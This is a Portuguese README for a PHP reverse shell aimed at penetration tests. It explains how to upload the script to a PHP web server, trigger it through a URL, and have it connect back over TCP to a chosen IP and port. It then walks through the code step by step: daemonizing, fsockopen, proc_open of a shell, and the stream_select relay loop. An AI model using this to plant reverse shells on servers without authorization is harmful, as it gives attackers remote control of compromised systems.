# <i> PHP Reverse Shell</i>👨🏻‍💻

<p align="justify">Esta ferramenta é projetada para aquelas situações durante um pentest onde você tem acesso a pagina de upload para um servidor web que está rodando PHP. Carregue este script em algum lugar na raiz da pagina na web e execute-o acessando o URL apropriado em seu navegador. O script abrirá uma conexão TCP de saída do servidor web para um host […]</p>

1. Definição de variáveis iniciais:
   - `set_time_limit(0);`: Define o limite de tempo de execução para ilimitado.
   - `$VERSION = "1.0";`: Define a versão do script.
   - `$ip = '127.0.0.1';`: Define o endereço IP para o qual a conexão de shell reverso será estabelecida.
   - `$port = 1234;`: Define a porta na qual a conexão de shell reverso será estabelecida.
   - `$chunk_size = 1400;`: Define o tamanho dos chunks (pedaços) de dados lidos e escritos durante a comunicação.

2. Daemonização (opcional):
   - A partir desta linha, o código tenta se tornar um processo daemon (processo em segundo plano). Essa parte do código permite que o script seja executado continuamente em segundo plano, mesmo depois que a conexão com o cliente é fechada. Ele usa a função `pcntl_fork` para criar um processo filho e, em seguida, o processo pai sai. O processo filho é definido como líder de sessão usando `posix_setsid`, tornando-se um daemon.

3. Configurações adicionais:
   - `chdir("/");`: Muda para o diretório raiz para evitar quaisquer problemas de diretório.
   - `umask(0);`: Remove qualquer umask herdado para garantir que as permissões dos arquivos criados sejam definidas corretamente.

4. Estabelecimento da conexão de shell reverso:
   - `fsockopen($ip, $port, $errno, $errstr, 30)`: Abre uma conexão de socket TCP para o endereço IP e porta especificados. Se a conexão for bem-sucedida, um socket será retornado.

5. Criação de um processo de shell:
   - `proc_open($shell, $descriptorspec, $pipes)`: Executa um comando shell especificado pela variável `$shell` e cria um processo. A saída padrão (stdout), a saída de erro (stderr) e a entrada padrão (stdin) do processo são redirecionadas para pipes, que podem ser acessados por meio dos recursos `$pipes`.

6. Loop principal:
   - O loop principal é executado continuamente enquanto a conexão de shell reverso estiver ativa.
   - Ele verifica se há dados disponíveis para leitura no socket TCP ou nos pipes de entrada/saída do processo de shell usando a função `stream_select`.
   - Se houver dados para ler do socket TCP, eles são enviados para a entrada padrão do processo de shell.
   - Se houver dados para ler dos pipes de saída do processo de shell (stdout e stderr), eles são enviados para o socket TCP.
   - O loop continua até que a conexão com o cliente seja encerrada ou o processo de shell seja encerrado.

7. Fechamento de recursos e encerramento:
   - Quando o loop principal é interrompido, todos os recursos abertos são fechados usando as funções `fclose` e `proc_close`. O script é encerrado.



